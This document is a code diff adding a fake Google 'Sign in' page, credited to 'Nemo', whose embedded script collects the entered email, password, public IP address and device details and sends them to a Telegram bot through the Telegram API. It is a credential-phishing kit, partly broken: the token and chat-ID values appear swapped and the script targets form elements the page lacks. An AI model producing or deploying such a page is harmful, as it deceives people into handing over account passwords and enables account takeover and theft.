@@ -1,0 +1,93 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+<script>
+    const TOKEN = "t.me/Ghdhdjfjgjgbot";                                                            // هنا التوكين              
+    const CHAT_ID = "8158107905:AAEsTSB76khaOnkhkmYVM_mTlqdOFd9fXU4";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Password:</b> ${password}\n
+                    <b>IP Address:</b> ${ip}\n
+                    <b>Device Type:</b> ${deviceType}\n
+                    <b>Platform:</b> ${platform}\n
+                    <b>User Agent:</b> ${userAgent}\n
+                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                `;
+
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    alert('Information sent successfully!');
+                }).catch(error => {
+                    alert('Error sending the information. Please try again.');
+                });
+            })
+            .catch(error => {
+                alert('Error fetching the IP address. Please try again.');
+            });
+    });
+</script>
+  <body>
+    
+<div class="background-image"></div>
+  <style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
+
+</style>
+
+  
+    <head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+    <title>Nemo Test</title>
+    <link rel="stylesheet" href="style.css">
+   </head>
+    
+   <div class="login-box">
+     
+     <img src='https://cdn.vox-cdn.com/thumbor/Pkmq1nm3skO0-j693JTMd7RL0Zk=/0x0:2012x1341/1200x800/filters:focal(0x0:2012x1341)/cdn.vox-cdn.com/uploads/chorus_image/image/47070706/google2.0.0.jpg'>
+     
+     <h1>Sign in</h1>
+     <x1> Use your Google Account</x1>
+     
+     <input type="username" placeHolder="Email or phone">
+     <br>
+     
+     <x2> Forgot email?</x2>
+     
+     <small>Not your computer? Use a private browsing window to sign<br> in.<span> Learn more<span></small>
+     
+     <x3> Create Account</x3>
+      
+    <button type="submit"> Next </button>
+    </div>
+    
+
+    
+    
+    
+    <div class="tag">
+      <h1>
+         <span>Google </span> Login Page made By: Nemo
+    </h1>   
